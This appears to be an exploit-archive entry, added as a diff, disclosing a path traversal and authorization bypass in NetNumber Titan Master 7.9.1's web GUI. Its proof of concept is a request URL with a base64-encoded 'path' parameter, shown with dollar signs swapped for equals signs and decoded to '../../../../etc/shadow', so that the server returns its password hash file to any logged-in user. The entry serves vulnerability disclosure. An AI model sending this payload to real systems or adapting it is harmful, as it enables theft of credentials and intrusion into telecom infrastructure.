@@ -1,0 +1,36 @@
+# Exploit Title: NetNumber Titan ENUM/DNS/NP - Path Traversal - Authorization Bypass
+# Google Dork: N/A
+# Date: 4/29/2019
+# Exploit Author: MobileNetworkSecurity
+# Vendor Homepage: https://www.netnumber.com/products/#data
+# Software Link: N/A
+# Version: Titan Master 7.9.1
+# Tested on: Linux
+# CVE : N/A
+# Type: WEBAPP
+
+*************************************************************************
+A Path Traversal issue was discovered in the Web GUI of NetNumber Titan 7.9.1.
+When an authenticated user attempts to download a trace file (through drp) by using a ../../ technique, arbitrary files can be downloaded from the server. Since the webserver running with elevated privileges it is possible to download arbitrary files.
+The HTTP request can be executed by any (even low privileged) user, so the authorization mechanism can be bypassed.
+*************************************************************************
+
+Proof of Concept (PoC):
+
+http://X.X.X.X/drp?download=true&path=Ly9TWVNURU0vc3lzdGVtL3RyYWNlP2Rvd25sb2FkPXQmZWw9Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw$$
+
+The vulnerable path parameter is base64 encoded where the equal sign replaced by the dollar sign.
+
+Original payload:
+Ly9TWVNURU0vc3lzdGVtL3RyYWNlP2Rvd25sb2FkPXQmZWw9Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw$$
+
+Replaced dollar signs:
+Ly9TWVNURU0vc3lzdGVtL3RyYWNlP2Rvd25sb2FkPXQmZWw9Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw==
+
+Base64 decoded payload:
+//SYSTEM/system/trace?download=t&el=../../../../etc/shadow
+
+In the HTTP response you will receive the content of the file.
+
+*************************************************************************
+The issue has been fixed in the newer version of the software.
